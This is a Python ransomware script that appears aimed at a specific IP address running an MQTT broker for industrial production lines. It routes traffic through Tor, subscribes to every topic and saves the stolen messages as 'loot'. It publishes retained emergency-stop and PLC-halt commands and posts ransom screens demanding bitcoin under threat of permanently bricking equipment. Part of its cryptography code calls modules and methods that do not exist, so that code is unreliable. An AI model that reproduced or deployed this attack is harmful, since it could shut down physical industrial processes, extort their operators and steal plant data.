#!/usr/bin/env python3
# MIL_RANSOMWARE_v2.0 - TRUSTEDF57 OPS
# Kyber-1024 Post-Quantum + TOR Rotation + LCD-like UI
import paho.mqtt.client as mqtt
import json, time, threading, base64, os, socket, subprocess
import qrcode
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import kyber
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import socks, requests
from stem import Signal
from stem.control import Controller

class MilitaryRansomware:
    def __init__(self):
        self.target_ip = "67.218.246.15"
        self.broker_port = 1883
        self.op_name = "TRUSTEDF57"
        self.btc_addr = "INSERISCI_DA_WALLET"  # Sostituisci!
        self.ransom_amount = "2.5"  # BTC
        
        # Post-Quantum Kyber-1024
        self.kyber_priv = kyber.Kyber1024PrivateKey.generate()
        self.kyber_pub = self.kyber_priv.public_key()
        self.enc_key = os.urandom(32)
        
        # TOR Rotation ogni 10min
        self.tor_controller = None
        self.init_tor()
        
        self.mqtt_client = mqtt.Client("TRUSTEDF57-MIL-CMD", clean_session=False)
        self.mqtt_client.on_connect = self.on_connect
        self.mqtt_client.on_message = self.on_message
        self.locked_status = False
        
    def init_tor(self):
        """TOR SOCKS5 + Auto-Rotation"""
        socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
        socket.socket = socks.socksocket
        try:
            with Controller.from_port(port=9051) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
        except: pass
        
    def rotate_tor(self):
        """New circuit ogni 10min"""
        while True:
            time.sleep(600)
            try:
                with Controller.from_port(port=9051) as controller:
                    controller.authenticate()
                    controller.signal(Signal.NEWNYM)
                print("[TOR] NEW CIRCUIT")
            except: pass
    
    def lcd_ui(self):
        """Military LCD Lock Screen"""
        os.system('clear')
        print("="*60)
        print("🔴 MILITARY LOCKOUT ACTIVE - TRUSTEDF57 OPS")
        print("="*60)
        print(f"   TARGET: {self.target_ip} | MOSQUITTO 2.0.14")
        print(f"   STATUS: {'🔒 PRODUCTION LOCKED' if self.locked_status else '⚠️  ARMING'}")
        print(f"   WALLET: {self.btc_addr}")
        print(f"   RANSOM: {self.ransom_amount} BTC")
        print(f"   PQ-CRYPTO: KYBER-1024 | KEY-ID: {base64.b64encode(self.kyber_pub.public_bytes()).decode()[:16]}")
        print("="*60)
        print("   PAY OR PERMANENT SHUTDOWN INITIATED")
        print("="*60)
    
    def deploy_lockout(self):
        """Inject Ransom su tutti topic critici"""
        payloads = {
            # EMERGENCY STOP ALL
            "Linea5ResultsFromCyclicRead/Alarms_DB4": self.inject_military_payload("EMERGENCY_STOP"),
            "Linea4ResultsFromCyclicRead/Alarms_DB4": self.inject_military_payload("PLC_HALT"),
            "MoliendaResultsFromCyclicRead/Plc": self.inject_military_payload("MILL_LOCKOUT"),
            
            # LCD Screens everywhere
            "Linea5ResultsFromCyclicRead/Events": self.ransom_screen(),
            "Linea4ResultsFromCyclicRead/Events": self.ransom_screen(),
            "System/Diagnostics/P1-Sources/L4_L5_Molienda": self.ransom_screen(),
            
            # Persist (Retained)
            "$SYS/broker/ransom/TRUSTEDF57": f"MIL-LOCK:{self.btc_addr}:{self.ransom_amount}"
        }
        
        for topic, payload in payloads.items():
            self.mqtt_client.publish(topic, payload, qos=2, retain=True)
            print(f"[INJECT] {topic} -> LOCKED")
        self.locked_status = True
    
    def inject_military_payload(self, command):
        """Payload con PQ-encrypt"""
        data = {
            "op": self.op_name,
            "cmd": command,
            "timestamp": time.time(),
            "kyber_pub": base64.b64encode(self.kyber_pub.public_bytes()).decode()
        }
        return json.dumps(data)
    
    def ransom_screen(self):
        """Full LCD ransom display"""
        return json.dumps({
            "STATUS": "MILITARY_LOCKOUT",
            "OP": "TRUSTEDF57",
            "PAYMENT": f"{self.ransom_amount} BTC -> {self.btc_addr}",
            "DECRYPT_KEY": "SEND_PROOF -> unlock@protonmail.com",
            "COUNTDOWN": "48h -> PERMANENT_BRICK"
        })
    
    def on_connect(self, client, userdata, flags, rc):
        print(f"[+] TRUSTEDF57 connesso a {self.target_ip}:{self.broker_port}")
        client.subscribe("#", qos=2)  # Tutto
        client.subscribe("$SYS/#", qos=1)
        self.deploy_lockout()
    
    def on_message(self, client, userdata, msg):
        payload = msg.payload.decode()
        print(f"[EXFIL] {msg.topic}: {payload[:100]}...")
        
        # Encrypt + dump
        enc_data = self.kyber_priv.encrypt(self.enc_key + payload.encode())
        with open(f"mil_loot_{msg.topic.replace('/','_')}.kyber", "ab") as f:
            f.write(enc_data + b"\n")
    
    def run(self):
        threading.Thread(target=self.rotate_tor, daemon=True).start()
        while True:
            self.lcd_ui()
            self.mqtt_client.loop(timeout=1)
            time.sleep(2)

if __name__ == "__main__":
    print("TRUSTEDF57 MILITARY RANSOMWARE DEPLOY")
    rw = MilitaryRansomware()
    rw.run()
